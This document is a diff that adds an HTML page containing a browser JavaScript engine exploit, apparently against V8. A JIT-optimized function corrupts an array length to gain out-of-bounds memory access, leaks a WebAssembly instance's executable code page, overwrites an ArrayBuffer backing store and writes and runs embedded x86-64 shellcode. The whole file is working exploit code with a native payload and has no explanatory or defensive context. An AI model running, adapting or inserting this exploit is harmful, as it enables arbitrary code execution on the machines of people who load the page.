@@ -1,0 +1,176 @@
+<script>
+    function force_gc() {
+        for (var i = 0; i < 0x80000; ++i) {
+            var a = new ArrayBuffer();
+        }
+    }
+    const shellcode = [
+        0x90909090, 0xF0E48366, 0x5A606A50, 0x6C616368, 0x48595463,
+        0x4865D429, 0x8B48328B, 0x8B481876, 0xAD481076,
+        0x48308B48, 0x03307E8B, 0x5C8B3C57, 0x748B2817,
+        0x0148201F, 0x1F548BFE, 0x2CB70F24, 0x02528D17,
+        0x073C81AD, 0x456E6957, 0x748BEF75, 0x01481C1F,
+        0xAE348BFE, 0x99F70148, 0x9090D7FF
+    ]
+    const arr_01 = [1.9, 1.8, 1.7];
+    var tmpidx = 0n;
+    var tmp_addr0 = 0n;
+    var addr_scop0 = 0n;
+    var backingStore_addr = 0n;
+    let backingStore_idx = 0n;
+    var leakObj_addr = 0n;
+    var leakObj_idx = 0n;
+    var m_addr = 0n;
+    var rwx_slot = 0n;
+    var rwxslot_idx = 0n;
+    var rwx_addr = 0n;
+    var wasm_buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 146, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 5, 104, 101, 108, 108, 111, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 16, 11, 11, 146, 128, 128, 128, 0, 1, 0, 65, 16, 11, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 0]);
+    var m = new WebAssembly.Instance(new WebAssembly.Module(wasm_buffer));
+    var h = new Uint8Array(m.exports.memory.buffer);
+    var p = m.exports.hello;
+
+    const buffer = new ArrayBuffer(16);
+    const dv = new DataView(buffer);
+    function f2Big(v) {
+        dv.setFloat64(0, v, true);
+        return dv.getBigUint64(0, true);
+    }
+    function Big2f(v) {
+        dv.setBigUint64(0, v, true);
+        return dv.getFloat64(0, true);
+    }
+    function f2BigHi(v) {
+        dv.setFloat64(0, v, true);
+        return (dv.getBigUint64(0, true)) >> 0x20n;
+    }
+    function f2BigLow(v) {
+        dv.setFloat64(0, v, true);
+        return (dv.getBigUint64(0, true)) & 0xffffffffn;
+    }
+    function fLow(v) {
+        dv.setFloat64(0, v, true);
+        return (dv.getUint32(0, true));
+    }
+    function fHi(v) {
+        dv.setFloat64(0, v, true);
+        return (dv.getUint32(4, true));
+    }
+    async function println(_str) {
+        document.write(_str);
+        document.write("<br>");
+    }
+    function hi(_addr) {
+        dv.setBigUint64(0, BigInt(_addr), true);
+        return dv.getUint32(4, true);
+    }
+    function low(_addr) {
+        dv.setBigUint64(0, BigInt(_addr), true);
+        return dv.getUint32(0, true);
+    }
+    function int2Big(low, hi) {
+        dv.setUint32(0, low, true);
+        dv.setUint32(4, hi, true);
+        return dv.getBigUint64(0, true);
+    }
+    function int2f(low, hi) {
+        let big = int2Big(low, hi);
+        return Big2f(big);
+    }
+    const sleep = min => new Promise(r => setTimeout(r, min));
+    async function trigger() {
+        array = Array(0x40000).fill(1.1);
+        args = Array(0x100 - 1).fill(array);
+        args.push(Array(0x40000 - 4).fill(2.2));
+        giant_array = Array.prototype.concat.apply([], args);
+        giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
+        length_as_double = new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];
+        force_gc(); force_gc();
+        // 设置length为0x133700，方便后面搜索确定对象地址
+        var rw_buffer = new ArrayBuffer(0x133700);
+        var obj_arr = [{}, m];
+        force_gc(); force_gc();
+        var rw_view = new DataView(rw_buffer);
+        const blob = new Blob([rw_buffer]);
+        force_gc(); force_gc();
+        function foo(array) {
+            var x = array.length;
+            x -= 67108861;
+            x = Math.max(x, 0);
+            x *= 6;
+            x -= 5;
+            x = Math.max(x, 0);
+            let corrupting_array = [0.1, 0.1];
+            let corrupted_array = [0.1];
+            corrupting_array[x] = length_as_double;
+            return corrupted_array;
+        }
+        for (let i = 0; i < 0x10000; ++i) {
+            foo(giant_array);
+        }
+        force_gc(); force_gc();
+        const rw_arr = foo(giant_array);
+        force_gc(); force_gc();
+        // alert(rw_arr.length.toString(16));
+        // alert("search 1.9=3ffe666666666666");
+        rw_view.setFloat64(0, 1.2, true);
+        // 3ff3333333333333=1.2
+        arr_01[0] = 3.4;//400b333333333333
+        obj_arr[1] = arr_01;
+        // alert("locate arr_01 and search addr");
+        // obj_arr[1] = rw_buffer;
+        obj_arr[1] = m;
+        // // alert("locate leakObj and rw_buffer addr");
+        let addr_arr0 = f2Big(rw_arr[8]) + 8n;
+        // alert("addr_arr0:" + addr_arr0.toString(16));
+        // 寻找中间的一个跳板，定位_addr，作为起始地址，进一步寻找其他对象
+        tmpidx = (0x1328 - 0x8) / 8;
+        tmp_addr0 = f2Big(rw_arr[tmpidx]);
+        //计算索引，也要被8整除
+        addr_scop0 = tmp_addr0 - (tmp_addr0 % 8n);
+        backingStore_addr = (addr_scop0 & 0xffffffffffff0000n) + 0x3730n;
+        // alert("backingStore_addr:" + backingStore_addr.toString(16));
+        backingStore_idx = (backingStore_addr - addr_arr0) / 8n;
+        // alert("backingStore:" + ((f2BigHi(rw_arr[backingStore_idx])) + ((f2BigLow(rw_arr[backingStore_idx + 1n]) << 0x20n))).toString(16));
+        leakObj_addr = (addr_scop0 & 0xffffffffffff0000n) + 0x3760n;
+        // alert("leakObj_addr:" + leakObj_addr.toString(16));
+        leakObj_idx = (leakObj_addr - addr_arr0) / 8n;
+        // hi(leakObj_addr)作为低4字节
+        // low(leakObj_addr+8)作为高4字节
+        // 注意涉及到左移和右移一定要加括号
+        m_addr = (addr_scop0 & 0xffffffff00000000n) + ((f2BigHi(rw_arr[leakObj_idx])) - 1n);
+        // alert("m_addr:" + m_addr.toString(16));
+
+
+
+        rwx_slot = m_addr + 13n * 8n;
+
+        if ((rwx_slot % 8n) == 4n) {
+            rwxslot_idx = (rwx_slot - addr_arr0 - 4n) / 8n;
+            // // alert((addr_scop0 & 0xffffffff00000000n).toString(16));
+            // // alert((f2BigHi(rw_arr[i])).toString(16));
+            rwx_addr = ((f2BigHi(rw_arr[rwxslot_idx])) + ((f2BigLow(rw_arr[rwxslot_idx + 1n]) << 0x20n)));
+        } else {
+            rwxslot_idx = (rwx_slot - addr_arr0) / 8n;
+            rwx_addr = f2Big(rw_arr[rwxslot_idx]);
+        }
+        // alert("rwx_addr:" + rwx_addr.toString(16));
+
+        // 将rwx_addr写入arr_buffer的backingStore
+        // low(rwx_addr)写入backingStore的hi
+        // hi(rwx_addr)写入backingStore+8的low
+        // alert("go to backingStore_addr:" + backingStore_addr.toString(16));
+        // alert("initial backingStore:" + ((f2BigHi(rw_arr[backingStore_idx])) + ((f2BigLow(rw_arr[backingStore_idx + 1n]) << 0x20n))).toString(16));
+        rw_arr[backingStore_idx] = int2f(fLow(rw_arr[backingStore_idx]), low(rwx_addr));
+        rw_arr[backingStore_idx + 1n] = int2f(hi(rwx_addr), fHi(rw_arr[backingStore_idx + 1n]));
+        // // // alert(0);
+        // rw_arr[backingStore_idx + 1n] = int2f(hi(rwx_addr), fHi(rw_arr[backingStore_idx + 1n]));
+        // alert("Final!!!backingStore:" + ((f2BigHi(rw_arr[backingStore_idx])) + ((f2BigLow(rw_arr[backingStore_idx + 1n]) << 0x20n))).toString(16));
+        // write Shellcode
+        for (let i = 0; i < shellcode.length; i++) {
+            rw_view.setUint32(i * 4, shellcode[i], true);
+        }
+        p();
+    }
+    trigger();
+
+</script>
